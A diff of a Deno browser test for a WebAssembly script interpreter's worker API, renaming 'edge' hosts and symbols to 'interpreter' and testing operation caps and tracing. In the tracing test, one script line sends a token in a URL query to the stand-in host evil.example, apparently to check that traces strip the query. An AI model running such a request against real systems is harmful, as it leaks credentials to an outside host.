@@ -4,10 +4,10 @@ import { readFileSync } from "node:fs";
 import { Buffer } from "node:buffer";
 
 // a host no network answers that the page loads the staged tree from
-const CDN_HOST = "edge.test";
+const CDN_HOST = "interpreter.test";
 // The staged CDN this run tests, served on loopback from cdn/ in CI and locally alike.
-const BASE = Deno.env.get("EDGE_CDN_BASE")?.replace(/\/$/, "");
-if (!BASE) throw new Error("set EDGE_CDN_BASE (make serve)");
+const BASE = Deno.env.get("INTERPRETER_CDN_BASE")?.replace(/\/$/, "");
+if (!BASE) throw new Error("set INTERPRETER_CDN_BASE (make serve)");
 
 const REPO = new URL("../../", import.meta.url).pathname; // the repo root
 const cases = JSON.parse(readFileSync(new URL("./js.json", import.meta.url)));
@@ -29,7 +29,7 @@ async function cdn(route, url) {
     return route.fulfill({ status: res.status, headers, body: Buffer.from(await res.arrayBuffer()) });
 }
 
-/* a minimal plugin module built by hand whose `boom` traps and `__edge_abi_version` reports `abi` */
+/* a minimal plugin module built by hand whose `boom` traps and `__interpreter_abi_version` reports `abi` */
 function pdkModule(abi) {
     const enc = new TextEncoder();
     const leb = (n) => { const out = []; do { let b = n & 0x7f; n >>>= 7; if (n !== 0) b |= 0x80; out.push(b); } while (n !== 0); return out; };
@@ -42,8 +42,8 @@ function pdkModule(abi) {
     const memory = section(5, vec([[0x00, 0x01]]));
     const exports = section(7, vec([
         [...name("memory"), 0x02, 0x00],
-        [...name("__edge_abi_version"), 0x00, 0x00],
-        [...name("__edge_alloc"), 0x00, 0x01],
+        [...name("__interpreter_abi_version"), 0x00, 0x00],
+        [...name("__interpreter_alloc"), 0x00, 0x01],
         [...name("boom"), 0x00, 0x02],
     ]));
     const code = section(10, vec([body([0x41, ...leb(abi)]), body([0x41, 0x00]), body([0x00])]));
@@ -202,7 +202,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         // A cap the embedder declares reaches the engine, the sandbox default finishes this loop.
         const capped = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const worker = await createWorker({ wasmUrl: "https://edge.test/interpreter.wasm", limits: { ops: 1000 } });
+            const worker = await createWorker({ wasmUrl: "https://interpreter.test/interpreter.wasm", limits: { ops: 1000 } });
             const { out } = await worker.run("var n = 0;\nfor (var i = 0; i < 100000; i = i + 1) n = n + 1;\nprint n;");
             worker.dispose();
             return out;
@@ -212,7 +212,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         // a traced run reports what it reached and a url without its query
         const trace = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const worker = await createWorker({ wasmUrl: "https://edge.test/interpreter.wasm", trace: true, permissions: { main: ["net"] } });
+            const worker = await createWorker({ wasmUrl: "https://interpreter.test/interpreter.wasm", trace: true, permissions: { main: ["net"] } });
             const events = [];
             worker.onTrace((event) => events.push(event));
             await worker.run("var net = import(\"net\");\nprint \"read it\";\nnet.request(\"GET\", \"https://evil.example/x?token=t-456\", nil, nil);\n");
